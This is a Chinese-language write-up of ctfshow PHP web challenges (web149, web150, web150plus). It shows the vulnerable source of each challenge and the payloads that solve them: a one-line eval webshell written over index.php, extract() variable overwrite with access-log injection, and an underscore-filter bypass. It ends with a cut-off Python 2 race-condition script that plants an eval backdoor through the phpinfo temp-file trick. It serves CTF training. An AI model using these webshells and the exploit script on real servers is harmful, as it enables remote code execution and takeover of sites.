<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 04:34:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;show&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>直接用一句话木马覆写掉index.php</p>
<pre tabindex="0"><code>GET ?ctf=index.php
POST show=&lt;?php @eval($_POST[&#39;1&#39;]);?&gt;
</code></pre><p>写入后</p>
<pre tabindex="0"><code>POST 1=system(&#39;cat /ctfshow_fl0g_here.txt&#39;);
</code></pre><h4 id="web150">web150<a hidden class="anchor" aria-hidden="true" href="#web150">#</a></h4>
<p>非预期 日志注入</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 07:12:57
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">class</span> <span class="nc">CTFSHOW</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">private</span> <span class="nv">$vip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">private</span> <span class="nv">$secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span> <span class="o">=</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isVIP</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span><span class="o">?</span><span class="k">TRUE</span><span class="o">:</span><span class="k">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">function</span> <span class="nf">__autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$class</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="nv">$class</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="c1">#过滤字符
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="c1"></span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\_| |\[|\]|\?/&#39;</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$__CTFSHOW__</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;class is exists!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$isVIP</span> <span class="o">&amp;&amp;</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题存在非预期，可以通过extract变量覆盖使isVIP=true，接着进行日志注入</p>
<p><img alt="image-20250124231951262" loading="lazy" src="assets/image-20250124231951262.png"></p>
<p>或者</p>
<p><img alt="image-20250126151004338" loading="lazy" src="../assets/image-20250126151004338.png"></p>
<p>把马写到日志里</p>
<p>payload:</p>
<pre tabindex="0"><code>GET ?isVIP=true&amp;1=system(&#39;cat f*&#39;);
POST ctf=/var/log/nginx/access.log
</code></pre><h4 id="web150plus">web150plus<a hidden class="anchor" aria-hidden="true" href="#web150plus">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 07:12:57
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">class</span> <span class="nc">CTFSHOW</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">private</span> <span class="nv">$vip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">private</span> <span class="nv">$secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span> <span class="o">=</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isVIP</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span><span class="o">?</span><span class="k">TRUE</span><span class="o">:</span><span class="k">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">function</span> <span class="nf">__autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$class</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="nv">$class</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="c1">#过滤字符
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="c1"></span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\_| |\[|\]|\?/&#39;</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$__CTFSHOW__</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;class is exists!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$isVIP</span> <span class="o">&amp;&amp;</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">FALSE</span> <span class="o">&amp;&amp;</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">,</span><span class="s2">&#34;log&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题ban掉了非预期解 日志注入的方法</p>
<p>首先我们需要知道__autoload方法的作用</p>
<ul>
<li><code>__autoload()</code>：自动加载函数，当使用未定义的类时会自动调用该函数。如果<code>$class</code>变量已设置，则将其作为函数调用。</li>
</ul>
<p>而且这题的__autoload并不在类CTFSHOW中（障眼法）</p>
<p><img alt="image-20250126154119464" loading="lazy" src="../assets/image-20250126154119464.png"></p>
<p>这个类在isVIP后面已经结束了</p>
<p>所以我们可以通过</p>
<pre tabindex="0"><code>if(class_exists($__CTFSHOW__)){
    echo &#34;class is exists!&#34;;
}
</code></pre><p>调用任意的类</p>
<p>我们可以根据php会将.解析成_的特性绕过正则</p>
<pre tabindex="0"><code>GET ?..CTFSHOW..=phpinfo
</code></pre><p><img alt="image-20250126154411534" loading="lazy" src="../assets/image-20250126154411534.png"></p>
<p>由于原题需要竞争所以后面就直接把flag放环境变量了</p>
<p>这里我们直接在phpinfo里面找就行</p>
<p><strong>原题解法</strong>
拿到phpinfo我们就可以getshell了</p>
<blockquote>
<p>PHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。假如在服务器上找不到我们可以包含的文件，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件了。如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。
原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902</p></blockquote>
<blockquote>
<p>过程
1.发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p>
<p>2.phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</p>
<p>3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p>
<p>4.操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p>
<p>5.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p>
<p>6.利用这个时间差，发第二个数据包，即可成功包含临时文件，最终getshell</p>
<p>处理
PHP 对 enctype=&ldquo;multipart/form-data&quot;请求的处理过程如下：
1、请求到达；
2、创建临时文件（通常是/tmp/php[6 个随机字符]），并写入上传文件的内容；
3、调用相应 PHP 脚本进行处理，如校验名称、大小等；
4、删除临时文件。
总结
php post 上传文件产生临时文件，phpinfo读临时文件的路径和名字，本地包含后生成后门
原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902</p></blockquote>
<p>大佬的脚本，但是是python2的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">  1</span><span class="cl"><span class="ch">#!/usr/bin/python </span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="ln">  5</span><span class="cl"> 
</span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">  7</span><span class="cl">    <span class="n">TAG</span><span class="o">=</span><span class="s2">&#34;Security Test&#34;</span>
</span></span><span class="line"><span class="ln">  8</span><span class="cl">    <span class="n">PAYLOAD</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;</span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="s2">&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;</span><span class="se">\r</span><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="n">TAG</span>
</span></span><span class="line"><span class="ln"> 10</span><span class="cl">    <span class="n">REQ1_DATA</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;-----------------------------7dbff1ded0714</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="s2">Content-Disposition: form-data; name=&#34;dummyname&#34;; filename=&#34;test.txt&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="s2">Content-Type: text/plain</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="s2"></span><span class="si">%s</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="s2">-----------------------------7dbff1ded0714--</span><span class="se">\r</span><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="n">PAYLOAD</span>
</span></span><span class="line"><span class="ln"> 16</span><span class="cl">    <span class="n">padding</span><span class="o">=</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">5000</span>
</span></span><span class="line"><span class="ln"> 17</span><span class="cl">    <span class="n">REQ1</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;POST /06/phpinfo.php?a=&#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34; HTTP/1.1</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="s2">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="s2">HTTP_ACCEPT: &#34;&#34;&#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="s2">HTTP_USER_AGENT: &#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="s2">HTTP_ACCEPT_LANGUAGE: &#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="s2">HTTP_PRAGMA: &#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="s2">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="s2">Content-Length: </span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 25</span><span class="cl"><span class="s2">Host: </span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="s2"></span><span class="si">%s</span><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">REQ1_DATA</span><span class="p">),</span><span class="n">host</span><span class="p">,</span><span class="n">REQ1_DATA</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 28</span><span class="cl">    <span class="c1">#modify this to suit the LFI script   </span>
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">    <span class="n">LFIREQ</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;GET /06/lfi.php?file=</span><span class="si">%s</span><span class="s2"> HTTP/1.1</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="s2">User-Agent: Mozilla/4.0</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 31</span><span class="cl"><span class="s2">Proxy-Connection: Keep-Alive</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="s2">Host: </span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 33</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 35</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 36</span><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">REQ1</span><span class="p">,</span> <span class="n">TAG</span><span class="p">,</span> <span class="n">LFIREQ</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 37</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 38</span><span class="cl"><span class="k">def</span> <span class="nf">phpInfoLFI</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">phpinforeq</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">lfireq</span><span class="p">,</span> <span class="n">tag</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 40</span><span class="cl">    <span class="n">s2</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 41</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 42</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 43</span><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
